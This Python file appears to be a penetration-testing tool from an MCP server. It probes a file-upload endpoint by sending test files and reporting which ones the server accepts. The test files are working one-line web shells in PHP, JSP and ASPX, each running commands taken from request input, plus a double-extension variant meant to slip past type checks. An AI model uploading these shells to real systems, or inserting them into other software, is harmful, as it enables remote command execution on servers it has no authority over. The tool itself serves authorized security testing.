"""Kill Chain — Delivery: test file upload endpoints for dangerous file acceptance."""
from __future__ import annotations

import os
import subprocess
import tempfile
from typing import Any

from mcp_servers.tools._common import SUBPROCESS_ENV, safe_filename, sanitize_input, save_to_workspace

_JSP_SHELL = b'<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'
_ASPX_SHELL = (
    b'<%@ Page Language="C#" %>'
    b'<% Response.Write(System.Diagnostics.Process.Start("cmd")); %>'
)

_TEST_FILES = [
    ("shell.php",      b"<?php system($_GET['cmd']); ?>",    "application/x-php"),
    ("shell.php.png",  b"<?php system($_GET['cmd']); ?>",    "image/png"),
    ("shell.jsp",      _JSP_SHELL,                           "application/octet-stream"),
    ("shell.aspx",     _ASPX_SHELL,                          "application/octet-stream"),
    ("safe.png",       b"\x89PNG\r\n\x1a\n" + b"\x00" * 16,  "image/png"),
]


def upload_test(url: str, field: str = "file") -> dict[str, Any]:
    """
    Test a file upload endpoint for dangerous file type acceptance.
    Sends .php, .jsp, .aspx, and double-extension payloads plus a legitimate PNG.
    Returns which types were accepted (HTTP 200/302) vs rejected.

    Args:
        url: Upload endpoint URL (e.g. http://localhost:8080/upload.php)
        field: Form field name for the file (default: 'file')
    """
    url = sanitize_input(url)
    field = sanitize_input(field) or "file"
    if not url:
        return {"status": "error", "error": "url required"}

    results = []
    with tempfile.TemporaryDirectory() as tmpdir:
        for filename, content, mime in _TEST_FILES:
            fpath = os.path.join(tmpdir, filename)
            with open(fpath, "wb") as f:
                f.write(content)

            cmd = [
                "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                "-F", f"{field}=@{fpath};type={mime}",
                url,
            ]
            try:
                r = subprocess.run(cmd, capture_output=True, text=True, timeout=15, env=SUBPROCESS_ENV)
                code = r.stdout.strip()
                accepted = code in ("200", "201", "302")
                results.append({"file": filename, "http_code": code, "accepted": accepted})
            except Exception as e:
                results.append({"file": filename, "error": str(e), "accepted": False})

    accepted = [r["file"] for r in results if r.get("accepted")]
    summary = f"Accepted: {accepted}" if accepted else "No dangerous file types accepted"
    out = "\n".join(
        f"{r['file']}: {r.get('http_code', 'ERR')} "
        f"({'ACCEPTED' if r.get('accepted') else 'rejected'})"
        for r in results
    )
    log_path = save_to_workspace(safe_filename(url, "upload_test"), out)

    return {
        "status": "success",
        "tool": "upload_test",
        "target": url,
        "summary": summary,
        "results": results,
        "dangerous_accepted": accepted,
        "full_output_file": log_path,
    }
